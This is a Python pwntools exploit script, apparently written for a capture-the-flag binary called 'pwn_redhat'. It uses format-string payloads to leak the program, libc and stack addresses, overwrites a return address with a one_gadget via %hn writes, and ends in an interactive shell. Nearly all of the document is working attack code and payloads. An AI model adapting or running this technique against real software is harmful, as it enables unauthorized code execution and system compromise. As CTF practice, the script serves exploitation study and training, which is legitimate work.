#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./pwn_redhat")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    #  io = process("./pwn_redhat")
    io = process("./pwn_redhat_patch_printf")
    libc = elf.libc


else:
    io = remote("localhost", 9999)
    #  libc = ELF("")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    DEBUG()
    io.sendlineafter(">>>", "%8$p..%9$p..%11$p..")
    elfBase = int(io.recvuntil("..", drop = True), 16) - 0x13C0
    success("elfBase -> {:#x}".format(elfBase))
    libc.address = int(io.recvuntil("..", drop = True), 16) - 241 - libc.sym[u'__libc_start_main']
    success("libc.address -> {:#x}".format(libc.address))
    stackAddr = int(io.recvuntil("..", drop = True), 16) 
    success("stackAddr -> {:#x}".format(stackAddr))
    retAddr = stackAddr - 0xe0
    success("retAddr -> {:#x}".format(retAddr))
    pause()

    payload = "%{}c%11$hn".format(retAddr & 0xffff)
    io.sendlineafter(">>>", payload)

    #  DEBUG()
    #  io.sendlineafter(">>>", "%36$p.%37$p.%38$p")
    oneGadget = 0x3f32a + libc.address
    payload = "%{}c%37$hn".format(oneGadget & 0xffff)
    #  DEBUG()
    io.sendlineafter(">>>", payload)

    io.interactive()
    io.close()



